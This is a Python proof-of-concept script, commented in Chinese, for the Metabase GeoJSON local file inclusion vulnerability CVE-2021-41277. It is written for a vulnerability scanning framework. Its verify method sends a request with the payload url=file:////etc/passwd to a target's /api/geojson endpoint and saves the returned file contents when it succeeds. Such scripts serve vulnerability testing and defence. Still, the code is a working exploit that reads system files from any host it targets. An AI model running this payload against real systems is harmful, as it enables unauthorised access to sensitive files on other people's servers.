from BasePoc import BasePoc               # 导入BasePoc，是PoC脚本实现的类中必须继承的基类
from utils import tree, highlight, req    # utils实现了一些常用函数，可以直接导入方便使用
from urllib.parse import urljoin
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning


POC_NAME = "Metabase_fileread_CVE_2021_41277"    # PoC脚本中实现的类名，TCC框架将根据POC_NAME去实例化类以达到调用的效果，因此类名应与该变量名保持相同


class Metabase_fileread_CVE_2021_41277(BasePoc):

    poc_info = {
        'poc': {
            'Id': 'vb_2021_0058',    # PoC的VID编号
            'vbid': '',
            'Name': 'Metabase_fileread_CVE_2021_41277',    # PoC名称
            'Author': 'lUc1f3r11',    # PoC作者
            'Create_date': '2021-11-22',    # PoC创建时间
            },

        'vul': {
            'Product': 'Metabase',    # 漏洞所在产品名称
            'Version': '',    # 产品的版本号
            'Type': 'LFI',    # 漏洞类型
            'Severity': 'high',    # 漏洞危害等级low/medium/high/critical
            'isWeb' : True,    # 是否Web漏洞
            'Description': '''
                Metabase is an open source data analytics platform. In affected versions a security issue has been discovered with the custom GeoJSON map (`admin->settings->maps->custom maps->add a map`) support and potential local file inclusion (including environment variables). URLs were not validated prior to being loaded. This issue is fixed in a new maintenance release (0.40.5 and 1.40.5), and any subsequent release after that. If you&#8217;re unable to upgrade immediately, you can mitigate this by including rules in your reverse proxy or load balancer or WAF to provide a validation filter before the application.
            ''',    # 漏洞简要描述
            'DisclosureDate': '2021-11-22',    # PoC公布时间
        }
    }


    # scan_info信息可以保持默认，相关参数如target/mode/verbose在TCC框架中都可以通过命令行参数设置
    scan_info = {
        'Target': '',    # 目标网站域名
        'Mode': 'verify',    # verify或exploit
        'Verbose': True,    # 是否打印详细信息
        'Error': '',    # 检测失败时可用于记录相关信息
        'Success': False,    # 是否检出漏洞，若检出请更新该值为True
        'risk_category': 'sec_vul',
        'Ret': tree()    # 可用于记录额外的一些信息
    }

    test_case = {
        'Need_fb': False,
        'Vuln': [],    # 列表格式的测试URL
        'Not_vuln': [],    # 同上
    }


    def verify(self, first=False):
        # 漏洞验证方法（mode=verify）
        target = self.scan_info.get("Target", "")    # 获取测试目标
        verbose = self.scan_info.get("Verbose", False)   # 是否打印详细信息

        Banner = '''
    _______      ________    ___   ___ ___  __        _  _  __ ___ ______ ______ 
    / ____\ \    / /  ____|  |__ \ / _ \__ \/_ |      | || |/_ |__ \____  |____  |
    | |     \ \  / /| |__ ______ ) | | | | ) || |______| || |_| |  ) |  / /    / / 
    | |      \ \/ / |  __|______/ /| | | |/ / | |______|__   _| | / /  / /    / /  
    | |____   \  /  | |____    / /_| |_| / /_ | |         | | | |/ /_ / /    / /   
    \_____|   \/   |______|  |____|\___/____||_|         |_| |_|____/_/    /_/                                                                                        
            '''
        print(Banner)

        # 以下是PoC的检测逻辑
        url1 = urljoin(target,"/api/geojson?url=file:////etc/passwd")

        header = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
            "cookie":"login=1",
        }

        print("[+] requesting vuln url1: ", url1)
        resp1 = requests.get(url=url1,headers=header, verify=False,timeout=5)
        print("[+] sending payload done... request status:", resp1.status_code)

        if resp1.status_code == 200 and "root" in resp1.text:
            self.scan_info['Success'] = True    # 漏洞存在，必须将该字段更新为True（必须）
            self.scan_info['Ret']['VerifyInfo']['URL'] = url1    # 记录漏洞相关的一些额外信息（可选）
            self.scan_info['Ret']['VerifyInfo']['DATA'] = resp1.text
            if verbose:
                highlight("[+] url: " + url1 + " 存在Metabase fileread CVE_2021_41277！！！")
        else:
            if verbose:
                highlight("[+] url: " + url1 + " 不存在Metabase fileread CVE_2021_41277！！！")

    def exploit(self, first=False):
        # 漏洞利用方法（mode=verify）
        self.verify(first=first)